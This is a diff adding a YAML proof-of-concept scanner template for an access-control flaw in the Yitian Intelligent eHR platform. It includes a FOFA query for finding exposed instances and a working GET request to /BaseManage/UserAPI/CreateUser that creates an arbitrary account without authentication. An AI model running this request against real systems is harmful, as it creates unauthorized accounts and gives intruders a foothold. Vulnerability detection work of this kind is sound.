@@ -1,0 +1,19 @@
+id: poc-yaml-yitian-intelligence-ehr-createuser-any-user-add
+info:
+  name: 易天智能eHR管理平台 CreateUser 任意用户添加漏洞
+  severity: high
+  tags:
+  - 访问控制错误
+  finger: 易天智能eHR管理平台
+  fofa: body="易天智能eHR管理平台"
+variables:
+  t1: random_str(4)
+  t2: random_str(8)
+  t3: random_int(10,1000)
+requests:
+- method: GET
+  path: /BaseManage/UserAPI/CreateUser?Account={{.t1}}&Password={{.t2}}&OuterID={{.t3}}
+  expression: "status_code == 200 && \ncontains(body,\"用户新增成功\") &&\ncontains(body,\"\
+    \\\"Status\\\": true\") &&\ncontains(body,t1) &&\ncontains(content_type,\"text/json\"\
+    )\n"
+transport: http
